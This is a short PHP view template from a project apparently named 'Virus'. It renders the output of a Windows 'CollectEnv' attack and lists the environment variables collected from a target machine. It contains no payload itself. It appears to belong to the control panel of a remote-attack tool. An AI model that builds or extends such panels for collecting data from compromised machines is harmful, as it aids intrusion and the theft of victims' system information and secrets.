<?php

use function Kelvinho\Virus\map;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectEnv\CollectEnv $attack */

?>
<p>This attack is executed. The environmental variables are:</p>
<ul style="overflow: auto;">
    <?php map($attack->getEnv(), function ($values, $key) { ?>
        <li>
            <pre><?php echo $key; ?></pre>
            <ul>
                <?php map($values, function ($value) { ?>
                    <li>
                        <pre><?php echo $value; ?></pre>
                    </li>
                <?php }); ?>
            </ul>
        </li>
    <?php }); ?>
</ul>